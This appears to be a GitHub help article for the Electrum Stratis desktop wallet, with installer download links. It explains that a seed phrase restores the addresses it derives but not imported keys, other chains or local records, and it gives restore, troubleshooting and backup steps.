![Electrum-Stratis](assets/banner-article.png)

# Is the seed enough to restore the wallet?

<p align="center">Enough for keys, not for every chain</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Yes - for the wallet that seed belongs to, the seed is enough. It rebuilds every address the wallet derives, on any machine, without the old file and without the old password. It is not enough for a different wallet, a different chain, or coins held at addresses the seed never generated. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| Your situation | Answer | Why |
|---|---|---|
| Lost the laptop, still have the seed | Restore and you are whole | The seed regenerates every address |
| Forgot the password, still have the seed | Restore into a fresh file | The old password is not needed |
| Have a seed from another wallet | It restores that wallet, not this one | Different derivation, different coin |
| Have the seed and a `.dat` with an unknown password | Use the seed | The file is optional; the seed is not |
| Seed restored, but one address is missing | Check the wallet type and derivation | Imported keys are not derived from a seed |

</div>

The rule is narrow and absolute: a seed restores what the seed generated. Anything added to a wallet by importing - a raw key, an address, a watch-only entry - lives outside that derivation and must be backed up on its own.

## Why it happens

A seed is not a password and not a file; it is the input to a deterministic process. Feed the same phrase to the same wallet and you get the same addresses in the same order, which is why a restore needs nothing else. That determinism is also the limit: a different wallet, or the same wallet configured for a different chain, produces different addresses from the same words.

This is the point at which users lose funds without noticing. A seed typed into a wallet configured for another chain restores successfully and shows an empty balance, and the empty balance looks like a failed restore rather than a correct one for the wrong chain. Checking the address preview against a known address is the only reliable test, and it takes seconds.

The restore flow in the maintained build, current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), previews the addresses it derives before committing, so a mismatch is visible before anything is written.

## Fix

1. **Restore on a clean install.** Choose Recover on first launch, pick the legacy seed restore, and type the phrase into the wallet window. Never into a website, a chat or a form.
2. **Read the address preview.** The wallet shows the addresses it derives before you commit. Compare the first one with an address you know received funds; if it matches, the seed and the configuration are right.
3. **Commit and let it sync.** The restored wallet rebuilds its history from the chain, so an empty balance before sync is expected on a fresh node connection.
4. **Check imported keys separately.** If the old wallet ever had a key or address imported by hand, that material is not in the seed. Restore it from the key backup, or sweep it if you still hold the key.
5. **Set a new password after restoring.** The restored wallet is a new file with its own encryption; the forgotten password stays behind and is never needed again.

If the preview shows the wrong addresses, stop before committing. The usual causes are a phrase from a different wallet, a mistyped word, or a restore attempted against the wrong chain.

## If that did not work

A restore that produces different addresses from a phrase you are sure about usually means one word is wrong - seed phrases carry a checksum, so most typos are rejected outright, but a valid-word substitution is not. Re-read the paper, not a photograph of it, and beware [Electrum Stratis recovery scams](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/paid-services-that-promise-funds-back.md).

A restore that produces the right addresses but an empty history means the wallet cannot see the chain yet. That is a connection problem rather than a seed problem, and the balance appears once the wallet reaches the current height.

A restore that produces the right addresses and a lower balance than expected is usually a missing imported key or an unconfirmed transaction. Neither is a seed failure.

## Prevention

- Verify the seed by restoring it once, before the wallet holds anything.
- Store the phrase on paper, in two places, written by hand.
- Note which chain and wallet the phrase belongs to, on the same paper.
- Back up imported keys separately, since they are not in the seed.
- Re-check the paper copy once a year against the wallet's own re-entry test.

## FAQ

### Is the seed enough to restore the wallet from anywhere?

Yes, for the wallet it belongs to: any machine, any operating system, no file and no password needed. It is not enough for a different wallet or a different chain, and it does not carry imported keys that were added by hand.

### How do I recover an Electrum wallet with a seed phrase?

Install the wallet, choose Recover rather than Create, select the legacy seed restore, type the phrase into the wallet window, check the address preview against a known address, then commit and let it sync. The whole procedure needs no old file.

### Does the seed also unlock my old encrypted wallet file?

No. The seed rebuilds the wallet from scratch; it does not decrypt the old file. That is why the seed path works after a forgotten password: the wallet that results is a new file with a new password, and the old one is simply left behind.

### What if my seed has 12 words and the wallet asks for 24?

Use the restore option that matches the phrase you have. A restore that expects a different length will reject the phrase rather than accept it silently, and the address preview is the second check - if the first address matches, the configuration is correct.

<!-- DOWNLOAD-BLOCK -->

Enough for the keys, not enough for everything around them. A seed restores addresses and balances on the legacy chain, but not labels, saved recipients or a transaction history you never recorded. If the coins matter, the seed is sufficient. If the records matter, keep the wallet file as well, because it carries the local history the phrase does not.

## Related articles

- [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md)
- [Electrum Stratis password recovery: what is possible](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/password-cannot-be-recovered.md)
- [Standard, multisig and imported wallets](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md)
- [Why is my balance missing? Three causes](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md)
